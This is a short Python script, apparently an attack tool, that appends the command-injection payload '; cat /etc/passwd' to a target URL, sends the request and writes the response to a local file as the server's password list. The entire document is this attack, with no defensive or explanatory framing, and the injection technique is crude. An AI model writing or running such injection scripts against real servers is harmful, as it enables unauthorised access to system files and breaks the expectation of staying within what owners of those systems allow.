import requests

def save_passwd_content(url, output_path):
    # Send a GET request to the original URL
    response = requests.get(url)

    # Define the payload to inject
    payload = "; cat /etc/passwd"

    # Create the injected URL by appending the payload
    injected_url = url + payload

    # Send a GET request to the injected URL
    response = requests.get(injected_url)

    # Get the content of the response
    passwd_content = response.text

    # Save the passwd content to a file
    with open(output_path, "w") as file:
        file.write(passwd_content)

# Example usage
url = "http://example.com/page"
output_path = "/path/to/save/passwd.txt"
save_passwd_content(url, output_path)
